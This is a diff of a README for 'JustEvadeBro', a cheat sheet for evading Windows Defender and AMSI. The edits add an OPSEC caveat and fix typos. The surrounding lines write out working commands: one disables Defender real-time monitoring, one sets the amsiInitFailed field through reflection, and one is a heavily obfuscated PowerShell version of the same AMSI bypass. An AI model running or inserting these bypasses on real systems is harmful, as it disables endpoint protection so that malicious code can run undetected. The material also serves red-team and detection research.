@@ -6,6 +6,8 @@ JustEvadeBro, a cheat sheet which will aid you through AMSI evasion.
 
 (Inspired by https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
 
+Please be aware that some of these methods may not be good for OPSEC. I will add a OPSEC method to each section in the future.
+
 Feel free to submit a Pull Request & leave a star to share some love if this helped you. 💖
 
 Yes, we are open to Pull Requests for Hacktoberfest! Please ensure its not spam and actually contributes well to this repo. Thanks & happy hacking!
@@ -23,7 +25,7 @@ Credit Info: I have obtained a lot of this info through other Github repos, blog
 First try turning of Windows Defender:
 ```Set-MpPreference -DisableRealtimeMonitoring $true```
 
-# Step two of evading Defender, evading ASMI
+# Step two of evading Defender, evading AMSI
 
 This will only work for `.ps1` files:
 ```
@@ -31,7 +33,7 @@ $a = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'si' + 'Utils')
 $a.GetField('am' + 'si' + 'Init' + 'Failed','NonPublic,Static').SetValue($null,$true)
 ```
 
-Another ASMI evading method:
+Another AMSI evading method:
 ```
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ;( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
 ```
